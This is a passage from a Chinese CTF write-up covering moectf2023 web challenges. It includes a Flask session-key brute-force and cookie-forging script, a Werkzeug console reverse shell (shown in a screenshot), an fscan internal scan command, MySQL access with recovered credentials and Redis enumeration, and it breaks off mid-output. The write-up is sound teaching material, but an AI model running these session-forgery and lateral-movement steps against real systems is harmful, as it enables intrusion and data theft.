XVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))        <span class="hljs-comment"># md5(username)^md5(password)</span><br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><code>def do_POST(self)</code>方法做了几个限制<br><code>username 不能等于 admin</code><br><code>username 不能等于 password</code><br>可以利用字符和数字进行绕过，例如<code>username=&quot;1&quot;  password=1</code><br><img src="/mdimg/moectf2023/35.png"></p><h3 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h3><p><code>moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</code>解压密码</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">本题你将扮演<span class="hljs-strong">**红队**</span>的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag<br><br>题目环境：http://47.115.201.35:8000/<br><br>在本次公共环境中渗透测试中，希望你<span class="hljs-strong">**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**</span><br><br><span class="hljs-strong">**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**</span><br><br>hint.zip 密码请在拿到外网靶机后访问根目录下的<span class="hljs-strong">**readme**</span>，完成条件后获取<br><br>环境出现问题，请第一时间联系出题人<span class="hljs-strong">**xlccccc**</span><br><br>对题目有疑问，也可随时询问出题人<br></code></pre></td></tr></table></figure><p>进入靶机注册登录之后<br><img src="/mdimg/moectf2023/36.png"><br>给了session 的key的前面的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            app = MockApp(secret_key)<br><br>            session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>            si = SecureCookieSessionInterface()<br>            s = si.get_signing_serializer(app)<br><br>            <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> secret_key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                compressed = <span class="hljs-literal">False</span><br>                payload = session_cookie_value<br>                <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                    compressed = <span class="hljs-literal">True</span><br>                    payload = payload[<span class="hljs-number">1</span>:]<br>                data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]<br>                data = base64_decode(data)<br>                <span class="hljs-keyword">if</span> compressed:<br>                    data = zlib.decompress(data)<br>                <span class="hljs-keyword">return</span> data<br>            <span class="hljs-keyword">else</span>:<br>                app = MockApp(secret_key)<br>                si = SecureCookieSessionInterface()<br>                s = si.get_signing_serializer(app)<br><br>                <span class="hljs-keyword">return</span> s.loads(session_cookie_value)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cnt = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        cookie_value = <span class="hljs-string">&#x27;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InpoYW55aSJ9.ZRU6Zg.c4JlmybB6IBoCVt7x1gJfKoRha4&#x27;</span><br>        secret_key = <span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;t-get&quot;</span> + os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()<br>        <span class="hljs-keyword">if</span> secret_key:<br>            result = FSCM.decode(cookie_value, secret_key)<br>        <span class="hljs-keyword">else</span>:<br>            result = FSCM.decode(cookie_value)<br>        cnt += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(result, cnt)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;power&#x27;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(result, secret_key, <span class="hljs-string">&#x27;YES&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>用脚本爆破得到key：<code>This-random-secretKey-you-can&#39;t-get002c</code><br>尝试session伪造</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key=<span class="hljs-string">&quot;This-random-secretKey-you-can&#x27;</span>t-get002c<span class="hljs-string">&quot;</span><br><span class="hljs-string">    print(FSCM.encode(key,&quot;</span>&#123;<span class="hljs-string">&#x27;power&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;<span class="hljs-string">&quot;))</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/37.png"><br><code>[http://47.115.201.35:8000/console](http://47.115.201.35:8000/console)</code>  <code>138-429-604</code><br>反弹shell<br><img src="/mdimg/moectf2023/38.png"><br><code>moectf&#123;Information-leakage-Is-dangerous!</code><br>另外根目录下也有readme文件<br><img src="/mdimg/moectf2023/39.png"><br><img src="/mdimg/moectf2023/40.png"><br>python获取本机内网ip<br><img src="/mdimg/moectf2023/41.png"><br>使用fscan扫描：<code>./fscan -h 172.21.0.3/24 -np -no -nopoc</code><br>解压密码：<code>22-3306-6379-8080</code></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果<br>可以看到，在本内网下还有另外两台服务器<br>其中一台开启了<span class="hljs-number">22</span>(ssh)和<span class="hljs-number">6379</span>(redis)端口<br>另一台开启了<span class="hljs-number">3306</span>(mysql)端口<br>还有一台正是你访问到的留言板服务<br>接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器<br>此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件<br>连接代理，推荐`proxychains`<br>对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2<br>对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/42.png"><br><img src="/mdimg/moectf2023/43.png"><br>在shell里装一个pymysql <code>pip install pymysql</code><br><img src="/mdimg/moectf2023/44.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import pymysql<br>&gt;&gt;&gt; db = pymysql.<span class="hljs-title function_ invoke__">connect</span>(host=<span class="hljs-string">&quot;mysql&quot;</span>,port=<span class="hljs-number">3306</span>,user=<span class="hljs-string">&quot;root&quot;</span>,passwd=<span class="hljs-string">&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;</span>,database=<span class="hljs-string">&quot;messageboard&quot;</span>,charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>&lt;Nev3r_Kn0w<span class="hljs-string">&quot;,database=&quot;</span>messageboard<span class="hljs-string">&quot;,charset=&#x27;utf8&#x27;)</span><br><span class="hljs-string">&gt;&gt;&gt; cursor=db.cursor()</span><br><span class="hljs-string">cursor=db.cursor()</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show databases<span class="hljs-string">&quot;)</span><br><span class="hljs-string">5</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>show tables<span class="hljs-string">&quot;)</span><br><span class="hljs-string">3</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;flag&#x27;,), (&#x27;message&#x27;,), (&#x27;users&#x27;,))</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">cursor.execute(&quot;</span>select *<span class="hljs-keyword">from</span> flag<span class="hljs-string">&quot;)</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&gt;&gt;&gt; cursor.fetchall()</span><br><span class="hljs-string">cursor.fetchall()</span><br><span class="hljs-string">((&#x27;-Are-YOu-myS0L-MasT3r?-&#x27;,),)</span><br><span class="hljs-string">&gt;&gt;&gt; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>得到<code>-Are-YOu-myS0L-MasT3r?-</code><br><code>pip install redis</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>&gt;&gt;&gt; r.<span class="hljs-title function_ invoke__">info</span>()<br>r.<span class="hljs-title function_ invoke__">info</span>()<br>&#123;<span class="hljs-string">&#x27;redis_version&#x27;</span>: <span class="hljs-string">&#x27;6.2.14&#x27;</span>, <span class="hljs-string">&#x27;redis_git_sha1&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_git_dirty&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_build_id&#x27;</span>: <span class="hljs-string">&#x27;32759a165f0d308e&#x27;</span>, <span class="hljs-string">&#x27;redis_mode&#x27;</span>: <span class="hljs-string">&#x27;standalone&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>: <span class="hljs-string">&#x27;Linux 5.15.0-71-generic x86_64&#x27;</span>, <span class="hljs-string">&#x27;arch_bits&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;monotonic_clock&#x27;</span>: <span class="hljs-string">&#x27;POSIX clock_gettime&#x27;</span>, <span class="hljs-string">&#x27;multiplexing_api&#x27;</span>: <span class="hljs-string">&#x27;epoll&#x27;</span>, <span class="hljs-string">&#x27;atomicvar_api&#x27;</span>: <span class="hljs-string">&#x27;c11-builtin&#x27;</span>, <span class="hljs-string">&#x27;gcc_version&#x27;</span>: <span class="hljs-string">&#x27;12.2.0&#x27;</span>, <span class="hljs-string">&#x27;process_id&#x27;</span>: <span class="hljs-number">19</span>, <span class="hljs-string">&#x27;process_supervised&#x27;</span>: <span class="hljs-string">&#x27;no&#x27;</span>, <span class="hljs-string">&#x27;run_id&#x27;</span>: <span class="hljs-string">&#x27;5ed13119850428cace41651d5a84dddee600dbe8&#x27;</span>, <span class="hljs-string">&#x27;tcp_port&#x27;</span>: <span class="hljs-number">6379</span>, <span class="hljs-string">&#x27;server_time_usec&#x27;</span>: <span class="hljs-number">1697725339377424</span>, <span class="hljs-string">&#x27;uptime_in_seconds&#x27;</span>: <span class="hljs-number">14190</span>, <span class="hljs-string">&#x27;uptime_in_days&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;configured_hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;lru_clock&#x27;</span>: <span class="hljs-number">3226523</span>, <span class="hljs-string">&#x27;executable&#x27;</span>: <span class="hljs-string">&#x27;/data/redis-server&#x27;</span>, <span class="hljs-string">&#x27;config_file&#x27;</span>: <span class="hljs-string">&#x27;/etc/redis/redis.conf&#x27;</span>, <span class="hljs-string">&#x27;io_threads_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;connected_clients&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;cluster_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxclients&#x27;</span>: <span class="hljs-number">10000</span>, <span class="hljs-string">&#x27;client_recent_max_input_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;client_recent_max_output_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;blocked_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;clients_in_timeout_table&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_rss&#x27;</span>: <span class="hljs-number">3837952</span>, <span class="hljs-string">&#x27;used_memory_rss_human&#x27;</span>: <span class="hljs-string">&#x27;3.66M&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_peak_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak_perc&#x27;</span>: <span class="hljs-string">&#x27;100.19%&#x27;</span>, <span class="hljs-string">&#x27;used_memory_overhead&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_startup&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_dataset&#x27;</span>: <span class="hljs-number">63760</span>, <span class="hljs-string">&#x27;used_memory_dataset_perc&#x27;</span>: <span class="hljs-string">&#x27;100.00%&#x27;</span>, <span class="hljs-string">&#x27;allocator_allocated&#x27;</span>: <span class="hljs-number">845608</span>, <span class="hljs-string">&#x27;allocator_active&#x27;</span>: <span class="hljs-number">1105920</span>, <span class="hljs-string">&#x27;allocator_resident&#x27;</span>: <span class="hljs-number">3469312</span>, <span class="hljs-string">&#x27;total_system_memory&#x27;</span>: <span class="hljs-number">1743826944</span>, <span class="hljs-string">&#x27;total_system_memory_human&#x27;</span>: <span class="hljs-string">&#x27;1.62G&#x27;</span>, <span class="hljs-string">&#x27;used_memory_lua&#x27;</span>: <span class="hljs-number">30720</span>, <span class="hljs-string">&#x27;used_memory_lua_human&#x27;</span>: <span class="hljs-string">&#x27;30.00K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory_scripts_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;number_of_cached_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;maxmemory_policy&#x27;</span>: <span 